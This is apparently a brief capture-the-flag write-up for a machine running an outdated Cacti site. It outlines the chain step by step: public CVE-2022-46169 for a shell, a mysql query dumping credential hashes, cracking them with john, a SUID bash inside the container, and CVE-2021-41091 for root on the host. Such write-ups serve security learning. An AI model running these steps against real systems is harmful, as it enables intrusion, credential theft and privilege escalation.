# Solve

1. outdated website, use public `CVE-2022-46169` to gain shell
2. most likely the website shell is ran inside a docker container, inspect the `entrypoint.sh`
3. using the hardcoded command, we can query the `user_auth` tables in the database to get credentials using the following command:    
`mysql --host=db --user=root --password=root cacti -e "select * from user_auth"`
4. crack the hash using `john`
5. connect and check the docker version. It is susceptible to `CVE-2021-41091`
6. back at the inside the docker abuse `/bin/bash` SUID to privsec to root      
`$ install -m =xs $(which bash) .`      
`$ /bin/bash -p`
7. recreate the `CVE-2021-41091` PoC  
    **inside the docker container:**    
    - `$ install -m =xs $(which bash) .`
    - `$ /bin/bash -p`
    - `$ chmod u+s /bin/bash`
    - `$ /bin/bash`  
    **then at the host machine:**    
    - copy the PoC script
    - run and follow the script instruction 